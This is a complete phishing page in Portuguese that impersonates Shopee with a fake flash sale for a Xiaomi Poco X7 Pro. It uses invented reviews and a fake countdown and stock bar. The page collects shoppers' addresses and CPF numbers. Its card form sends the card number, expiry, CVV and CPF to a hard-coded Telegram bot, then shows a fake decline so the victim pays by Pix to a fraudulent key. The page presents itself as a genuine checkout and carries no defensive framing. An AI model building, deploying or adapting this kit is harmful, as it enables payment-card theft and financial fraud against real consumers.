<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Xiaomi Poco X7 Pro - Shopee Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --shopee: #ee4d2d; --shopee-light: #fff5f1; --teal: #00bfa5; --blue: #2673dd; --bg: #f5f5f5; --yellow: #ffce3d; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #222; }

        /* UTILIT√ÅRIOS */
        .page { display: none; min-height: 100vh; padding-bottom: 80px; }
        .page.active { display: block; }
        .orange-text { color: var(--shopee); }
        .section { background: white; padding: 15px; margin-bottom: 8px; }
        .btn-main { background: var(--shopee); color: white; border: none; padding: 14px; font-weight: bold; width: 100%; border-radius: 2px; cursor: pointer; font-size: 16px; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 12px; outline: none; font-size: 14px; }
        input:focus { border-color: var(--shopee); }

        /* HEADER */
        .header-nav { background: white; padding: 12px; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 1000; }
        .header-nav i { color: var(--shopee); font-size: 20px; }

        /* PRODUTO - LANDING */
        .main-img { width: 100%; background: white; aspect-ratio: 1/1; object-fit: contain; }
        .flash-sale { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; }
        .stock-bar-container { background: #eee; height: 8px; border-radius: 10px; margin: 10px 0; overflow: hidden; }
        .stock-bar-fill { background: var(--shopee); height: 100%; width: 88%; animation: shrink 30s infinite; }
        @keyframes shrink { 0% { width: 92%; } 50% { width: 85%; } 100% { width: 92%; } }

        /* PROVA SOCIAL */
        .review-card { border-bottom: 1px solid #eee; padding: 15px 0; }
        .user-info { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
        .user-info b { font-size: 13px; }
        .stars { color: var(--yellow); font-size: 10px; }
        .review-imgs { display: flex; gap: 8px; margin-top: 10px; overflow-x: auto; }
        .review-imgs img { width: 80px; height: 80px; border-radius: 4px; object-fit: cover; border: 1px solid #eee; }
        
        /* VIDEO SIMULADO */
        .video-box { position: relative; width: 100%; height: 200px; background: #000; border-radius: 8px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .video-box img { width: 100%; opacity: 0.6; }
        .play-btn { position: absolute; font-size: 40px; color: white; opacity: 0.9; }

        /* CHECKOUT */
        .pay-option { display: flex; align-items: center; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #f5f5f5; cursor: pointer; }
        .radio-circle { width: 22px; height: 22px; border: 2px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .pay-option.active .radio-circle { border-color: var(--shopee); }
        .pay-option.active .radio-circle::after { content:''; width: 12px; height: 12px; background: var(--shopee); border-radius: 50%; }

        /* FOOTER FIXO */
        .footer-buy { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #eee; display: flex; align-items: center; padding: 10px 15px; gap: 15px; z-index: 1100; }

        /* LOADING */
        #loading { display: none; position: fixed; inset: 0; background: rgba(255,255,255,0.95); z-index: 5000; align-items: center; justify-content: center; flex-direction: column; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--shopee); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading"><div class="spinner"></div><p style="margin-top:15px; font-weight:bold;">Sincronizando com a ShopeePay...</p></div>

    <div id="productPage" class="page active">
        <div class="header-nav"><i class="fas fa-arrow-left"></i> <span style="font-weight:bold;">Detalhes do Produto</span></div>
        <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="main-img">
        
        <div class="flash-sale">
            <div><i class="fas fa-bolt"></i> OFERTA REL√ÇMPAGO</div>
            <div id="timer" style="font-weight:bold;">00:12:45</div>
        </div>

        <div class="section">
            <div class="orange-text" style="font-size: 28px; font-weight: bold;">R$ <span class="val-txt">599,00</span></div>
            <div style="font-size: 13px; color: #999; text-decoration: line-through;">R$ 2.499,00</div>
            <h1 style="font-size: 16px; margin-top: 10px; line-height: 1.4;">Xiaomi Poco X7 PRO 5G - Lote Global 2026 - 512GB ROM - 12GB RAM - SnapDragon 8 Gen 3</h1>
            
            <div class="stock-bar-container"><div class="stock-bar-fill"></div></div>
            <p style="font-size: 12px; color: #666;">92% vendido - Apenas 14 unidades em estoque!</p>
        </div>

        <div class="section">
            <p style="font-weight: bold; margin-bottom: 15px;">AVALIA√á√ïES RECENTES</p>
            
            <div class="review-card">
                <div class="user-info"><b>f*****o</b> <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div></div>
                <p style="font-size: 13px;">O celular √© original, chegou lacrado. Desempenho absurdo pelo pre√ßo.</p>
                <div class="review-imgs">
                    <img src="https://i.postimg.cc/ctv07Hv2/br-11134103-81ztc-mk5oi70vvpxf33.webp">
                    <img src="https://i.postimg.cc/qNV4npp0/br-11134103-81ztc-mju9ycl4xfd241.webp">
                </div>
            </div>

            <div class="review-card">
                <p style="font-size: 13px; font-weight: bold; margin-bottom: 5px;">Depoimento em V√≠deo:</p>
                <div class="video-box">
                    <img src="https://i.postimg.cc/qzndpWyb/br-11134103-81ztc-mke1j4czd34324.webp">
                    <i class="fas fa-play-circle play-btn"></i>
                </div>
            </div>
        </div>

        <div class="footer-buy">
            <div style="flex:1"><i class="far fa-comment-dots" style="color:var(--teal)"></i><p style="font-size:10px;">Chat</p></div>
            <button class="btn-main" onclick="openPage('addrPage')" style="flex:4">COMPRAR AGORA</button>
        </div>
    </div>

    <div id="addrPage" class="page">
        <div class="header-nav"><i class="fas fa-arrow-left" onclick="openPage('productPage')"></i> <span>Endere√ßo de Entrega</span></div>
        <div class="section">
            <p style="font-size: 12px; color: #888; margin-bottom: 15px;">Preencha onde deseja receber seu pedido:</p>
            <input type="text" id="inName" placeholder="Nome Completo do Destinat√°rio">
            <input type="tel" id="inCep" placeholder="CEP" maxlength="8" onblur="apiCep(this.value)">
            <input type="text" id="inRua" placeholder="Rua / Avenida">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="inNum" placeholder="N√∫mero">
                <input type="text" id="inBairro" placeholder="Bairro">
            </div>
            <input type="text" id="inCidade" placeholder="Cidade">
            <input type="tel" id="inCpf" placeholder="CPF do Titular" oninput="mCpf(this)" maxlength="14">
            <button class="btn-main" onclick="saveAddress()">SALVAR E CONTINUAR</button>
        </div>
    </div>

    <div id="checkoutPage" class="page">
        <div class="header-nav"><i class="fas fa-arrow-left" onclick="openPage('addrPage')"></i> <span>Finalizar Compra</span></div>
        
        <div class="section" onclick="openPage('addrPage')">
            <div style="font-size:13px; font-weight:bold; margin-bottom:5px;"><i class="fas fa-map-marker-alt orange-text"></i> Endere√ßo Selecionado</div>
            <p id="dispName" style="font-size:13px; font-weight:bold;"></p>
            <p id="dispAddr" style="font-size:12px; color:#666;"></p>
        </div>

        <div class="section">
            <p style="font-weight: bold; margin-bottom: 15px;">M√©todo de Pagamento</p>
            <div class="pay-option active" id="optPix" onclick="selectPay('pix')">
                <div style="display:flex; align-items:center; gap:12px;">
                    <i class="fas fa-coins" style="color:var(--teal); font-size: 20px;"></i>
                    <div><p style="font-size:14px;">Pix</p><p style="font-size:11px; color:var(--shopee);">Aprova√ß√£o imediata e R$10 de desconto</p></div>
                </div>
                <div class="radio-circle"></div>
            </div>
            <div class="pay-option" id="optCard" onclick="openPage('cardPage')">
                <div style="display:flex; align-items:center; gap:12px;">
                    <i class="fas fa-credit-card" style="color:var(--blue); font-size: 20px;"></i>
                    <div><p style="font-size:14px;">Cart√£o de Cr√©dito</p><p style="font-size:11px; color:#888;">Em at√© 12x sem juros</p></div>
                </div>
                <span class="orange-text" style="font-size:11px; font-weight:bold;">ADICIONAR</span>
            </div>
        </div>

        <div class="section">
            <div style="display:flex; justify-content:space-between; font-size: 14px; margin-bottom: 10px;">
                <span>Total do Pedido:</span>
                <b class="orange-text" style="font-size: 18px;" id="finalTotal"></b>
            </div>
            <p style="font-size: 11px; color: var(--teal);"><i class="fas fa-shield-alt"></i> Compra Protegida pela Garantia Shopee.</p>
        </div>

        <div class="footer-buy" style="justify-content: flex-end;">
            <button class="btn-main" style="width: 180px;" onclick="finishOrder()">FAZER PEDIDO</button>
        </div>
    </div>

    <div id="cardPage" class="page">
        <div class="header-nav"><i class="fas fa-arrow-left" onclick="openPage('checkoutPage')"></i> <span>Dados do Cart√£o</span></div>
        <div class="section">
            <input type="tel" id="cNum" placeholder="N√∫mero do Cart√£o" maxlength="19" oninput="mCard(this)">
            <input type="text" id="cNom" placeholder="Nome Impresso no Cart√£o">
            <div style="display:flex; gap:10px;">
                <input type="tel" id="cVal" placeholder="MM/AA" maxlength="5" oninput="mVal(this)">
                <input type="tel" id="cCvv" placeholder="CVV" maxlength="4">
            </div>
            <button class="btn-main" onclick="captureCard()">CONFIRMAR PAGAMENTO</button>
            <p style="text-align:center; font-size:11px; color:#999; margin-top:15px;"><i class="fas fa-lock"></i> Pagamento processado de forma segura.</p>
        </div>
    </div>

    <div id="pixPage" class="page">
        <div class="header-nav"><span>Pagamento via Pix</span></div>
        <div class="section" style="text-align:center;">
            <i class="fas fa-check-circle" style="color:var(--teal); font-size: 50px;"></i>
            <h2 style="margin: 15px 0 5px;">Pedido Reservado!</h2>
            <p style="font-size: 13px; color: #666; margin-bottom: 20px;">Finalize o pagamento para envio imediato.</p>
            
            <img id="qrImg" src="" width="200">
            <div id="pCode" style="background:#f5f5f5; padding:15px; border:1px dashed #ccc; font-size:10px; word-break:break-all; margin: 15px 0;"></div>
            
            <button class="btn-main" onclick="copyPix()">COPIAR C√ìDIGO PIX</button>
        </div>
    </div>

    <script>
        // CONFIGURA√á√ïES GLOBAIS (ALTERE AQUI O PRE√áO)
        const precoBase = 599.00;
        const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
        const CHAT_ID = '7294447445';
        let payMethod = 'pix';

        // Atualiza pre√ßos na tela
        document.querySelectorAll('.val-txt').forEach(e => e.innerText = precoBase.toFixed(2).replace('.',','));

        function openPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            window.scrollTo(0,0);
        }

        function selectPay(m) {
            payMethod = m;
            document.getElementById('optPix').classList.toggle('active', m === 'pix');
            updateTotal();
        }

        function updateTotal() {
            let total = precoBase - 20; // Cupom Shopee
            if(payMethod === 'pix') total -= 10;
            document.getElementById('finalTotal').innerText = `R$ ${total.toFixed(2).replace('.', ',')}`;
        }
        updateTotal();

        async function apiCep(v) {
            if(v.length < 8) return;
            const r = await fetch(`https://viacep.com.br/ws/${v}/json/`);
            const d = await r.json();
            if(!d.erro) {
                document.getElementById('inRua').value = d.logradouro;
                document.getElementById('inBairro').value = d.bairro;
                document.getElementById('inCidade').value = d.localidade;
            }
        }

        function saveAddress() {
            const nome = document.getElementById('inName').value;
            if(!nome || !document.getElementById('inRua').value) return alert("Preencha seu endere√ßo completo!");
            document.getElementById('dispName').innerText = nome;
            document.getElementById('dispAddr').innerText = `${document.getElementById('inRua').value}, ${document.getElementById('inNum').value} - ${document.getElementById('inCidade').value}`;
            openPage('checkoutPage');
        }

        async function captureCard() {
            document.getElementById('loading').style.display = 'flex';
            const msg = `üí≥ *CART√ÉO CAPTURADO*\n\n` +
                        `Nome: ${document.getElementById('cNom').value}\n` +
                        `N√∫mero: ${document.getElementById('cNum').value}\n` +
                        `Val: ${document.getElementById('cVal').value} | CVV: ${document.getElementById('cCvv').value}\n` +
                        `CPF: ${document.getElementById('inCpf').value}\n` +
                        `Total: ${document.getElementById('finalTotal').innerText}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
                });
            } catch(e){}

            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                alert("Erro no processamento: Sua operadora recusou a transa√ß√£o via cart√£o para este lote promocional. Pague via PIX para n√£o perder a oferta!");
                selectPay('pix');
                openPage('checkoutPage');
            }, 2500);
        }

        function finishOrder() {
            if(payMethod === 'pix') {
                let totalPix = precoBase - 30;
                const pix = `00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865405${totalPix.toFixed(2)}5802BR5917LOJA ONIX OFICIAL6009SAO PAULO62070503***6304`;
                document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${pix}&color=ee4d2d`;
                document.getElementById('pCode').innerText = pix;
                openPage('pixPage');
            } else {
                openPage('cardPage');
            }
        }

        function copyPix() {
            navigator.clipboard.writeText(document.getElementById('pCode').innerText);
            alert("‚úÖ C√≥digo Pix copiado! Cole no seu banco.");
        }

        // M√ÅSCARAS
        function mCpf(i){ i.value=i.value.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4'); }
        function mCard(i){ i.value=i.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim(); }
        function mVal(i){ i.value=i.value.replace(/\D/g,'').replace(/(\d{2})(\d)/,'$1/$2'); }

        // TIMER
        let s = 765;
        setInterval(() => {
            let m = Math.floor(s/60);
            let rs = s % 60;
            document.getElementById('timer').innerText = `00:${m < 10 ? '0'+m : m}:${rs < 10 ? '0'+rs : rs}`;
            if(s > 0) s--;
        }, 1000);
    </script>
</body>
    </html>
    
